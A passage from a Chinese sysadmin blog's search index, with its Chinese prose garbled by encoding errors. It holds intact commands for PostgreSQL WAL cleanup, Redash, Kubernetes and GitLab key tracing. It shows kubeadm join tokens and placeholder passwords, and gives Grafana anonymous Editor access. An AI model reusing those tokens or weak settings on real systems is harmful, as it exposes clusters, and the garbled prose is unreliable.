çš„ç£ç›˜ç©ºé—´è¢«å¡æ»¡ï¼Œæœ€ç»ˆå¯¼è‡´DBæŒ‚æ‰æˆ–è€…èµ·ä¸æ¥ã€‚é‡åˆ°è¿™ç§æƒ…å†µä¸ç”¨æ…Œï¼Œå¯ä»¥å…ˆå…³é—­å½’æ¡£æˆ–è€…æµå¤åˆ¶åŠŸèƒ½ï¼Œå¤‡ä»½pg_xlogæ—¥å¿—åˆ°å…¶ä»–åœ°æ–¹ï¼Œä½†è¯·ä¸è¦åˆ é™¤ã€‚ç„¶ååˆ é™¤è¾ƒæ—©æ—¶é—´çš„çš„pg_xlogï¼Œæœ‰ä¸€å®šç©ºé—´åå†è¯•ç€å¯åŠ¨Postgresã€‚ checkpoint(å‚è€ƒ) https://www.phpyuan.com/article/128760.html http://blog.itpub.net/29990276/viewspace-2654054/ æ¸…ç†æ—¥å¿—(å‚è€ƒ) https://blog.csdn.net/dazuiba008/article/details/100659749 ","date":"2022-03-03 15:04","objectID":"/post/2802/:0:1","tags":["postgresql","pgsql"],"title":"pg_xlogè¿‡å¤§æ¸…ç†","uri":"/post/2802/"},{"categories":["databases"],"content":"æ¸…ç†æ­¥éª¤ echo 'checkpoint' | psql -Upostgres pg_controldata /data/postgresql # ä¸»è¦çœ‹ä¸‹é¢è¿™ä¸¤ä¸ªå€¼ Latest checkpoint location: 1C81/69444018 Prior checkpoint location: 1C81/69443F58 Latest checkpoint's REDO location: 1C81/69443FC8 Latest checkpoint's REDO WAL file: 0000000500001C8100000069 # æ¸…ç†0000000500001C8100000069ä¹‹åçš„æ—¥å¿—æ–‡ä»¶ pg_archivecleanup /data/postgresql/pg_xlog/ 0000000500001C8100000069 ","date":"2022-03-03 15:04","objectID":"/post/2802/:0:2","tags":["postgresql","pgsql"],"title":"pg_xlogè¿‡å¤§æ¸…ç†","uri":"/post/2802/"},{"categories":["golang"],"content":"æœ‰ç¬¦å·æ•´æ•°å‹ ç±»å‹ å ç”¨å†…å­˜ æ•°å€¼èŒƒå›´ int 32ä½ç³»ç»Ÿ-4byte 64ä½ç³»ç»Ÿ-8byte -2147483648~2147483647 -9223372036854775808~9223372036854775807 int8 1byte -128~127 int16 2byte -32768~32767 int32ï½œrune 4byte -2147483648~2147483647 int64 8byte -9223372036854775808~9223372036854775807 ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:1","tags":["golang","go"],"title":"golangæ•°æ®ç±»å‹","uri":"/post/2798/"},{"categories":["golang"],"content":"æ— ç¬¦å·æ•´æ•°å‹ ç±»å‹ å ç”¨å†…å­˜ æ•°å€¼èŒƒå›´ uint 32ä½ç³»ç»Ÿ-4byte 64ä½ç³»ç»Ÿ-8byte 0~4294967295 0~18446744073709551615 uint8ï½œbyte 1byte 0~255 uint16 2byte 0~65535 uint32 4byte 0~4294967295 uint64 8byte 0~18446744073709551615 ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:2","tags":["golang","go"],"title":"golangæ•°æ®ç±»å‹","uri":"/post/2798/"},{"categories":["golang"],"content":"æµ®ç‚¹ç±»å‹ ç±»å‹ å ç”¨å†…å­˜ æ•°å€¼èŒƒå›´ float32 4byte å°æ•°ä½ç²¾ç¡®åˆ°7ä½ float64 8byte å°æ•°ä½ç²¾ç¡®åˆ°15ä½ ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:3","tags":["golang","go"],"title":"golangæ•°æ®ç±»å‹","uri":"/post/2798/"},{"categories":["golang"],"content":"åŒ…åç§° åŒ…åç§°å’Œæ‰€åœ¨çš„ç›®å½•ä¿æŒä¸€è‡´ï¼ŒåŒ…ååº”è¯¥æ˜¯å°å†™,ä¸ä½¿ç”¨ä¸‹åˆ’çº¿æˆ–è€…æ··åˆå¤§å°å†™ package events ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:1","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["golang"],"content":"æ–‡ä»¶å å°å†™,ä½¿ç”¨ä¸‹åˆ’çº¿åˆ†å‰²å•è¯ configmap_manager.go ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:2","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["golang"],"content":"ç»“æ„ä½“ é©¼å³°å‘½åï¼Œå¤§é©¼å³°è¿˜æ˜¯å°é©¼å³°å–å†³äºè®¿é—®æƒé™ type simpleConfigMapManager struct { kubeClient clientset.Interface } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:3","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["golang"],"content":"æ¥å£å‘½å åŒç»“æ„ä½“ï¼Œåå­—ä¸€èˆ¬ä»¥erç»“å°¾ type Manager interface { GetConfigMap(namespace, name string) (*v1.ConfigMap, error) RegisterPod(pod *v1.Pod) UnregisterPod(pod *v1.Pod) } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:4","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["golang"],"content":"å˜é‡å‘½å åŒç»“æ„ä½“ï¼Œå¦‚æœå˜é‡ç±»å‹ä¸º bool ç±»å‹ï¼Œåˆ™åç§°åº”ä»¥ has, is, can æˆ– allow å¼€å¤´ã€‚ var isExist bool var hasConflict bool var canManage bool var allowGitHook bool ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:5","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["golang"],"content":"å•å…ƒæµ‹è¯• æ–‡ä»¶åä»¥_test.goç»“å°¾ï¼Œæµ‹è¯•ç”¨ä¾‹ä¸­çš„å‡½æ•°ä»¥Testå¼€å¤´ // implicit_test.go func TestImplicit(t *testing.T) { } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:6","tags":["golang","go"],"title":"golangå‘½åè§„èŒƒ","uri":"/post/2797/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£… å®‰è£…docker-compose curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose é…ç½®env secretå¯ä»¥ç”¨pwgen -1s 32ç”Ÿæˆ PYTHONUNBUFFERED=0 REDASH_LOG_LEVEL=INFO REDASH_REDIS_URL=redis://redis:6379/0 POSTGRES_PASSWORD=123 REDASH_COOKIE_SECRET=456 REDASH_SECRET_KEY=789 REDASH_DATABASE_URL=postgresql://postgres:123@postgres/postgres REDASH_MAIL_SERVER=\"1.1.1.1\" REDASH_MAIL_PORT=25 REDASH_MAIL_USE_TLS=\"false\" REDASH_MAIL_USE_SSL=\"false\" REDASH_MAIL_DEFAULT_SENDER=\"redash@soulchild.cn\" å‡†å¤‡yaml version: \"2\" x-redash-service: \u0026redash-service image: redash/redash:10.0.0.b50363 depends_on: - postgres - redis env_file: /opt/redash/env restart: always services: server: \u003c\u003c: *redash-service command: server ports: - \"5000:5000\" environment: REDASH_WEB_WORKERS: 4 scheduler: \u003c\u003c: *redash-service command: scheduler environment: QUEUES: \"celery\" WORKERS_COUNT: 1 scheduled_worker: \u003c\u003c: *redash-service command: worker environment: QUEUES: \"scheduled_queries,schemas\" WORKERS_COUNT: 1 adhoc_worker: \u003c\u003c: *redash-service command: worker environment: QUEUES: \"queries\" WORKERS_COUNT: 2 redis: image: redis:5.0-alpine restart: always postgres: image: postgres:9.6-alpine env_file: /opt/redash/env volumes: - /data/postgres-data:/var/lib/postgresql/data restart: always nginx: image: redash/nginx:latest ports: - \"80:80\" depends_on: - server links: - server:redash restart: always å¯åŠ¨ # åˆå§‹åŒ–æ•°æ®åº“(åªæœ‰ç¬¬ä¸€æ¬¡å¯åŠ¨éœ€è¦æ‰§è¡Œ) docker-compose run --rm server create_db # å¯åŠ¨redashç›¸å…³ç»„ä»¶ docker-compose up -d ","date":"2022-02-16 13:10","objectID":"/post/2796/:0:1","tags":["redash"],"title":"redashå®‰è£…å‡çº§","uri":"/post/2796/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‡çº§ å‡çº§ä¸èƒ½å®ç‰ˆæœ¬å‡çº§,éœ€è¦ä¸€ä¸ªç‰ˆæœ¬ä¸€ä¸ªç‰ˆæœ¬çš„å‡çº§. 1.é¦–å…ˆå¤‡ä»½pgæ•°æ®åº“å’Œenv docker-compose exec postgres pg_dump -Upostgres -d postgres \u003e /backup/redash-backup.sql cp env /backup/env 2.å‡çº§é•œåƒ,ä¿®æ”¹yamlä¸ºæ–°ç‰ˆæœ¬çš„é•œåƒ 3.å‡çº§db docker-compose run --rm server manage db upgrade 4.å¯åŠ¨æœåŠ¡ docker-compose up -d ","date":"2022-02-16 13:10","objectID":"/post/2796/:0:2","tags":["redash"],"title":"redashå®‰è£…å‡çº§","uri":"/post/2796/"},{"categories":["docker"],"content":"è§£å†³åŠæ³•ï¼š 1ã€å°†docker-runcæ›¿æ¢ä¸ºrunc grep -rl â€˜docker-runcâ€™ /var/lib/docker/containers/ | xargs sed -i â€™s/docker-runc/runc/gâ€™ 2ã€é‡å¯docker systemctl restart docker ","date":"2022-02-10 16:13","objectID":"/post/2795/:0:0","tags":["docker"],"title":"è§£å†³dockerå‡çº§åä¸å…¼å®¹é—®é¢˜Error response from daemon: Unknown runtime specified docker-runc","uri":"/post/2795/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"é™¤äº†iftopå¤–è¿˜æœ‰ä¸€äº›æŸ¥çœ‹ç½‘ç»œå¸¦å®½çš„å·¥å…·å¾ˆå¥½ç”¨ï¼Œè®°å½•ä¸€ä¸‹é˜²æ­¢å¿˜è®° ","date":"2022-02-07 13:23","objectID":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:0:0","tags":["command","network"],"title":"å¸¸ç”¨ç½‘ç»œå¸¦å®½æµ‹è¯•å·¥å…·","uri":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1. nload yum install -y nload nload eth0 20230207135602.png ","date":"2022-02-07 13:23","objectID":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:0:1","tags":["command","network"],"title":"å¸¸ç”¨ç½‘ç»œå¸¦å®½æµ‹è¯•å·¥å…·","uri":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.nethogs å¯ä»¥æ˜¾ç¤ºè¿›ç¨‹çš„pid yum install nethogs nethogs eth0 20230207135348.png ","date":"2022-02-07 13:23","objectID":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:0:2","tags":["command","network"],"title":"å¸¸ç”¨ç½‘ç»œå¸¦å®½æµ‹è¯•å·¥å…·","uri":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3.iptraf yum install -y iptraf iptraf-ng -d eth0 20230207135711.png ","date":"2022-02-07 13:23","objectID":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:0:3","tags":["command","network"],"title":"å¸¸ç”¨ç½‘ç»œå¸¦å®½æµ‹è¯•å·¥å…·","uri":"/post/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":["databases"],"content":"å®‰è£…æ–‡æ¡£ https://www.percona.com/doc/percona-server/5.6/tokudb/tokudb_installation.html yum remove mariadb-libs yum install -y libaio perl-devel jemalloc autoconf perl-Test-Simple ä¸‹è½½åœ°å€ https://downloads.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.51-91.0/binary/redhat/7/x86_64/Percona-Server-5.6.51-91.0-rb59139e-el7-x86_64-bundle.tar rpm -ivh * å…³é—­å¤§é¡µå†…å­˜ echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled echo never \u003e /sys/kernel/mm/transparent_hugepage/defrag å®‰è£…udf mysql -uroot -p -e \"CREATE FUNCTION fnv1a_64 RETURNS INTEGER SONAME 'libfnv1a_udf.so'\" mysql -uroot -p -e \"CREATE FUNCTION fnv_64 RETURNS INTEGER SONAME 'libfnv_udf.so'\" mysql -uroot -p -e \"CREATE FUNCTION murmur_hash RETURNS INTEGER SONAME 'libmurmur_udf.so'\" å¯ç”¨tokudb ps_tokudb_admin --enable -u root -p å¯ç”¨çƒ­å¤‡ä»½åŠŸèƒ½ ps_tokudb_admin --enable-backup -uroot -p å¼€å§‹ä¸€ä¸ªçƒ­å¤‡ä»½ mysql\u003e set tokudb_backup_dir='/var/lib/mysql-bak/'; Query OK, 0 rows affected (0.14 sec) CREATE DATABASE `testdb1` DEFAULT CHARACTER SET utf8; CREATE TABLE `ad` ( `id` int(8) unsigned NOT NULL, `content` text, PRIMARY KEY (`id`) ) ENGINE=TokuDB DEFAULT CHARSET=utf8; æœ€ç»ˆé…ç½®æ–‡ä»¶ # Percona Server template configuration [mysqld] character-set-server = utf8 collation-server = utf8_general_ci # # Remove leading # and set to the amount of RAM for the most important data # cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%. # innodb_buffer_pool_size = 128M # # Remove leading # to turn on a very important data integrity option: logging # changes to the binary log between backups. # log_bin # # Remove leading # to set options mainly useful for reporting servers. # The server defaults are faster for transactions and fast SELECTs. # Adjust sizes as needed, experiment to find the optimal values. # join_buffer_size = 128M # sort_buffer_size = 2M # read_rnd_buffer_size = 2M datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock pid-file = /var/run/mysqld/mysqld.pid log-error = /var/log/mysqld.err # me relay_log_info_repository=TABLE master_info_repository=TABLE relay_log_recovery=ON # Slow Log Settings slow_query_log log-slow-slave-statements long_query_time = 1 slow_query_log_file = /var/log/mysql-slow.log # Tunning #key_buffer_size = 2G #myisam_sort_buffer_size = 128M memlock max_allowed_packet = 64M table_open_cache = 512 sort_buffer_size = 2M read_buffer_size = 1M read_rnd_buffer_size = 4M query_cache_size = 0 query_cache_type = 0 thread_cache_size = 64 net_buffer_length = 512K wait_timeout = 30 max_connections = 512 max_connect_errors = 100000 interactive_timeout = 180 # tokudb loose-tokudb_fs_reserve_percent = 1 #toku backup requirement innodb_use_native_aio=0 # master slave server-id = 200 # Master Settings #log-bin = /home/mysql/binlog/mysql-bin #binlog_format= row #statement,mixed,row #max_binlog_size = 100M #expire-logs-days = 7 log-slave-updates # Slave Settings relay-log = mysql-relay-bin # Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0 # Recommended in standard MySQL setup sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES [mysqld_safe] preload-hotbackup thp-setting=never log-error=/var/log/mysqld.log pid-file=/var/run/mysqld/mysqld.pid ","date":"2022-01-28 21:38","objectID":"/post/2791/:0:0","tags":["mysql"],"title":"mysql tokudbå¼•æ“","uri":"/post/2791/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æŸ¥çœ‹è¯ä¹¦ echo | openssl s_client -servername xxx.com -connect soulchild.cn:443 2\u003e/dev/null | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' ","date":"2022-01-18 17:36","objectID":"/post/2788/:0:1","tags":["ssl","openssl"],"title":"opensslæŸ¥çœ‹è¯ä¹¦","uri":"/post/2788/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"è¿‡æœŸæ—¶é—´ echo | openssl s_client -servername xxx.com -connect soulchild.cn:443 2\u003e/dev/null | openssl x509 -noout -dates ","date":"2022-01-18 17:36","objectID":"/post/2788/:0:2","tags":["ssl","openssl"],"title":"opensslæŸ¥çœ‹è¯ä¹¦","uri":"/post/2788/"},{"categories":["åŸºç¡€å†…å®¹","ç›‘æ§"],"content":"https://grafana.com/docs/grafana/latest/auth/overview/#anonymous-authentication é…ç½®å¦‚ä¸‹ [auth] disable_login_form = true [auth.anonymous] enabled = true # åŒ¿åæƒé™ç›¸å…³é…ç½® org_role = Editor ","date":"2022-01-13 19:27","objectID":"/post/2786/:0:0","tags":["grafana"],"title":"grafanaåŒ¿åç™»é™†","uri":"/post/2786/"},{"categories":["kubernetes"],"content":"å‚è€ƒ: https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/ https://kubernetes.io/zh/docs/reference/setup-tools/kubeadm/kubeadm-init ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:0","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"ä¸€ã€è°ƒæ•´å†…æ ¸å‚æ•°åŠæ¨¡å— cat \u003c\u003cEOF | sudo tee /etc/modules-load.d/k8s.conf br_netfilter EOF cat \u003c\u003cEOF | sudo tee /etc/modules-load.d/containerd.conf overlay br_netfilter EOF sudo modprobe overlay sudo modprobe br_netfilter # è®¾ç½®å¿…éœ€çš„ sysctl å‚æ•°ï¼Œè¿™äº›å‚æ•°åœ¨é‡æ–°å¯åŠ¨åä»ç„¶å­˜åœ¨ã€‚ cat \u003c\u003cEOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-ip6tables = 1 EOF # åº”ç”¨ sysctl å‚æ•°è€Œæ— éœ€é‡æ–°å¯åŠ¨ sudo sysctl --system ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:1","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"äºŒã€ä¿®æ”¹ä¸»æœºåã€é…ç½®hosts cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.33.162 k8s-master 10.0.33.163 k8s-node1 10.0.33.164 k8s-node2 10.0.33.165 k8s-node3 10.0.33.166 k8s-node4 10.0.33.167 k8s-node5 10.0.33.168 k8s-node6 10.0.33.169 k8s-node7 EOF ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:2","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"ä¸‰ã€å®‰è£…containerd sudo apt-get remove docker docker-engine docker.io containerd runc sudo apt-get update sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null sudo apt-get update sudo apt-get install containerd sudo mkdir -p /etc/containerd containerd config default | sudo tee /etc/containerd/config.toml sudo systemctl start containerd ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:3","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"å››ã€é…ç½®containerd # ä¿®æ”¹cgroupsä¸ºsystemd sudo sed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml # ä¿®æ”¹åŸºç¡€è®¾æ–½é•œåƒ sudo sed -i 's#sandbox_image = \"k8s.gcr.io/pause:3.5\"#sandbox_image = \"registry.aliyuncs.com/google_containers/pause:3.6\"#' /etc/containerd/config.toml sudo systemctl restart containerd ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:4","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"å››ã€å®‰è£…kubeadmã€kubectlã€kubelet curl -fsSL https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/kubernetes-archive-keyring.gpg echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list sudo apt-get update sudo apt-get install -y kubelet=1.23.1 kubeadm=1.23.1 kubectl=1.23.1 # é˜»æ­¢upgradeçš„æ—¶å€™æ›´æ–°åŒ… sudo apt-mark hold kubelet kubeadm kubectl ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:5","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"äº”ã€å®‰è£… sudo kubeadm init --kubernetes-version stable-1 \\ --apiserver-advertise-address 10.0.33.162 \\ --control-plane-endpoint k8s-master \\ --image-repository registry.aliyuncs.com/google_containers \\ --pod-network-cidr 172.17.0.0/16 \\ --service-cidr 172.16.0.0/16 \\ --cri-socket /run/containerd/containerd.sock \\ --ignore-preflight-errors NumCPU \\ --upload-certs --v 5| tee kubeadm-init.log ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:6","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"å…­ã€é…ç½®kubeconfig mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:7","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"ä¸ƒã€æ·»åŠ èŠ‚ç‚¹ # masterèŠ‚ç‚¹ kubeadm join k8s-master:6443 --token 0s2sl7.dz31xgqybfiytgpk \\ --discovery-token-ca-cert-hash sha256:4ae005a85ef260b48a71cd5c93f4a7900e376b03ff80debe3cd08ab14021535b \\ --control-plane --certificate-key 9980691961686c8cbf8a3ddb4ecdde88e80f40d65f7b270ab3dc8e8afbc36102 # nodeèŠ‚ç‚¹ kubeadm join k8s-master:6443 --token 0s2sl7.dz31xgqybfiytgpk \\ --discovery-token-ca-cert-hash sha256:4ae005a85ef260b48a71cd5c93f4a7900e376b03ff80debe3cd08ab14021535b ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:8","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"å…«ã€å®‰è£…calico curl https://docs.projectcalico.org/archive/v3.20/manifests/calico.yaml -O kubectl apply -f calico.yaml ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:9","tags":["k8s"],"title":"ubuntuä½¿ç”¨kubeadmå®‰è£…k8s1.23.1","uri":"/post/2785/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æŸå®šæ—¶ä»»åŠ¡æç¤ºgitlabè´¦å·è¢«é”å®š,å¯¼è‡´æ— æ³•æ­£å¸¸æ‰§è¡Œ,çŒœæµ‹å¯èƒ½æ˜¯ç”±äºäººå‘˜ç¦»èŒ,gitlabè´¦å·è¢«ç¦ç”¨å¯¼è‡´ã€‚ç§é’¥å¯ä»¥æŸ¥çœ‹åˆ°,ä½†æ˜¯ç”±äºä¸çŸ¥é“å…¬é’¥é…ç½®åˆ°å“ªä¸ªäººçš„è´¦æˆ·ä¸‹äº†ï¼Œæ‰€ä»¥éœ€è¦æŸ¥ä¸€ä¸‹å…¬é’¥é…ç½®åœ¨å“ªä¸ªç”¨æˆ·ä¸Š,ä½†æ˜¯gitlabä¸Šæ²¡æœ‰ç›¸å…³çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å‡†å¤‡å»æ•°æ®åº“é‡ŒæŸ¥è¯¢ä¸€ä¸‹ ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:0","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.æ ¹æ®ç§é’¥æ¨å¯¼å‡ºå…¬é’¥ ssh-keygen -y -e -f /root/.ssh/id_rsa ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:1","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2.è¿æ¥gitlabæ•°æ®åº“ sudo -u gitlab-psql /opt/gitlab/embedded/bin/psql -h /var/opt/gitlab/postgresql -d gitlabhq_production ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:2","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3.æŸ¥çœ‹è¿™ä¸ªå…¬é’¥æ˜¯å“ªä¸ªç”¨æˆ·åˆ›å»ºçš„ # å–å…¬é’¥çš„ä¸€æ®µå†…å®¹,æ¨¡ç³ŠæŸ¥è¯¢å³å¯ \\x select user_id,key,type from keys where key like '%xxxxxxxxx%'; ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:3","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4.æ ¹æ®ç”¨æˆ·idæŸ¥çœ‹ç”¨æˆ·é‚®ç®± select email from users where id = '210'; è‡³æ­¤,æœ¬ä»¥ä¸ºå¯ä»¥å»é‚£ä¸ªäººçš„è´¦æˆ·åˆ é™¤å…¬é’¥,ä½¿ç”¨å…¬å…±è´¦æˆ·é‡æ–°æ·»åŠ ,ä½†æ˜¯è¿™ä¸–é—´å¾€å¾€æ€»æ˜¯äº‹ä¸æ„¿è¿ï¼Œåœ¨è¿™ä¸ªäººçš„ssh keysé‡Œå¹¶æ²¡å‘ç°è¿™ä¸ªå…¬é’¥,åé¢å‘ç°è¿™ä¸ªå…¬é’¥çš„ç±»å‹æ˜¯DeployKey,æ‰€ä»¥å‡†å¤‡å»æŸ¥çœ‹å…¨å±€DeployKeys(è®¾ç½®[Admin Area]-DeployKeys)ã€‚ ä½†æ˜¯å¹¶æ²¡æœ‰åœ¨DeployKeysä¸­æ‰¾åˆ°ç›¸å…³å…¬é’¥,æƒ³äº†æƒ³å¯èƒ½æ˜¯åœ¨gitlabä»“åº“ä¸­æ·»åŠ çš„,äºæ˜¯å»å®šæ—¶ä»»åŠ¡ä½¿ç”¨çš„gitlabä»“åº“ä¸­æŸ¥çœ‹(ä»“åº“-Settings-Repository-Deploy Keys),å‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒåƒçš„,ç”±äºä¸èƒ½çœ‹åˆ°å…¬é’¥ä¿¡æ¯,åªèƒ½æŸ¥çœ‹æŒ‡çº¹ä¿¡æ¯,æ‰€ä»¥éœ€è¦è®¡ç®—ä¸€ä¸‹å…¬é’¥çš„æŒ‡çº¹,åšä¸€ä¸‹å¯¹æ¯”. ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:4","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"5.è®¡ç®—å…¬é’¥æŒ‡çº¹ md5: echo 'ssh-rsa AAAAxxx6xxxxxxxxx' | ssh-keygen -E md5 -lf - sha256: echo 'ssh-rsa AAAAxxx6xxxxxxxxx' | ssh-keygen -lf - å‘ç°æ˜¯ä¸€è‡´çš„,è¿™ç§åªé’ˆå¯¹æŸä¸ªä»“åº“å»ºçš„deploykey,æ˜¯å¯ä»¥åˆ é™¤çš„ ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:5","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"6.åˆ é™¤ä½¿ç”¨é‡å»ºä¸€ä¸ªå…¨å±€çš„deploykey","date":"2021-12-27 10:59","objectID":"/post/2783/:0:6","tags":["gitlab"],"title":"gitlabæŸ¥æ‰¾å¿˜è®°çš„å…¬é’¥","uri":"/post/2783/"},{"categories":["äº‘åŸç”Ÿ"],"content":"1. éƒ¨ç½²è¢«æ³¨å…¥æ•…éšœçš„æœåŠ¡ apiVersion: apps/v1 kind: Deployment metadata: name: web-show labels: app: web-show spec: replicas: 1 selector: matchLabels: app: web-show template: metadata: labels: app: web-show spec: containers: - name: web-show image: pingcap/web-show imagePullPolicy: Always command: - /usr/local/bin/web-show - --target-ip=$(targetIP) env: - name: targetIP valueFrom: fieldRef: apiVersion: v1 fieldPath: status.hostIP ports: - name: web-port containerPort: 8081 hostPort: 8081 --- apiVersion: v1 